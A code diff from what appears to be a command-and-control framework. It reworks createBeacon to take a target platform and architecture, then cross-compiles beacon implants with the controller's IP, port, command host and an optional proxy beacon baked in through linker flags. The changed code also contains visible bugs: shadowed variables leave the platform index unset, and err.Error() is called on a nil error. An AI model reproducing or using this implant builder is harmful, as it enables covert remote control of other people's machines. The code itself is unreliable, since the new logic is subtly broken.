@@ -16,37 +16,48 @@ var platforms = map[string][]string {
 	"windows": []string{"386", "amd64"},
 }
 
-func createBeacon(listener int) {
+func createBeacon(listener int, platform string, arch string) {
 	reader := bufio.NewReader(os.Stdin)
+	var target string
+	var targetArch string
+	var platformIdx int
 
-	info("Pick target")
-	listTargets()
-	input := readLine()
-	num, err := strconv.Atoi(input)
+	if platform == "" {
+		info("Pick platform")
+		listTargets()
+		input := readLine()
+		platformIdx, err := strconv.Atoi(input)
 
-	if err != nil || num < 0 || num > len(targets) {
-		info("Invalid choice. " + err.Error())
-		return
+		if err != nil || platformIdx < 0 || platformIdx > len(targets) {
+			info("Invalid choice. " + err.Error())
+			return
+		}
+		target = targets[platformIdx]
+	} else {
+		target = platform
 	}
 
-	target := targets[num]
 
-	info("Pick platform")
-	listPlatforms(target)
-	input = readLine()
-	num2, err := strconv.Atoi(input)
+	if arch == "" {
+		info("Pick arch")
+		listPlatforms(target)
+		input := readLine()
+		arch, err := strconv.Atoi(input)
 
-	if err != nil || num2 < 0 || num2 > len(platforms[target]) {
-		info("Invalid choice.")
-		return
+		if err != nil || arch < 0 || arch > len(platforms[target]) {
+			info("Invalid choice.")
+			return
+		}
+		targetArch = getPlatform(platformIdx, arch)
+	} else {
+		targetArch = arch
 	}
 
-	platform := getPlatform(num, num2)
 
-	info("Using " + target + "/" + platform)
+	info("Using " + target + "/" + targetArch)
 
 	//fmt.Print("Proxy? (y/n): ")
-	input = "n"//, err = reader.ReadString('\n')
+	input := "n"//, err = reader.ReadString('\n')
 	ip := getIfaceIp(listeners[listener].Iface)
 	port := strconv.Itoa(listeners[listener].Port)
 	beaconId := genRandID()
@@ -89,10 +100,10 @@ func createBeacon(listener int) {
 		notifyBeaconOfProxyUpdate(beacon, beaconId)
 
 		info("Using beacon " + beacon.Id + "@" + beacon.Ip + " as proxy.")
-		cmdHandle = exec.Command("/bin/sh", "-c", "cd beacon; env CGO_ENABLED=0 GOOS=" + target + " GOARCH=" + platform + " go build -ldflags '" + buildFlags + " -X main.id=" + beaconId + " -X main.cmdProxyId=" + beacon.Id + " -X main.cmdProxyIp=" + beacon.Ip + " -X main.cmdAddress=" + ip + " -X main.cmdPort=" + port + " -X main.cmdHost=command.com' -o out/" + beaconName + " beacon/*.go")
+		cmdHandle = exec.Command("/bin/sh", "-c", "cd beacon; env CGO_ENABLED=0 GOOS=" + target + " GOARCH=" + targetArch + " go build -ldflags '" + buildFlags + " -X main.id=" + beaconId + " -X main.cmdProxyId=" + beacon.Id + " -X main.cmdProxyIp=" + beacon.Ip + " -X main.cmdAddress=" + ip + " -X main.cmdPort=" + port + " -X main.cmdHost=command.com' -o out/" + beaconName + " beacon/*.go")
 	} else {
 		info("No proxy")
-		cmdHandle = exec.Command("/bin/sh", "-c", "cd beacon; env CGO_ENABLED=0 GOOS=" + target + " GOARCH=" + platform + " go build -ldflags '" + buildFlags + " -X main.id=" + beaconId + " -X main.cmdAddress=" + ip + " -X main.cmdPort=" + port + " -X main.cmdHost=command.com' -o ../out/" + beaconName)
+		cmdHandle = exec.Command("/bin/sh", "-c", "cd beacon; env CGO_ENABLED=0 GOOS=" + target + " GOARCH=" + targetArch + " go build -ldflags '" + buildFlags + " -X main.id=" + beaconId + " -X main.cmdAddress=" + ip + " -X main.cmdPort=" + port + " -X main.cmdHost=command.com' -o ../out/" + beaconName)
 	}
 
 	stderr, err := cmdHandle.StderrPipe()
